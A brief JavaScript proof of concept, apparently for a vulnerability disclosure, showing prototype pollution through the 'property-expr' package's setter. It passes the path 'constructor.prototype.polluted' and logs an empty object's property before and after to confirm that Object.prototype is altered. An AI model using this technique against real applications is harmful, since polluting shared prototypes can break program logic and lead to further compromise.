var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
let expr = require('property-expr');
obj = {};
console.log({}.polluted);
expr.setter('constructor.prototype.polluted')(obj, 'yes');
console.log({}.polluted);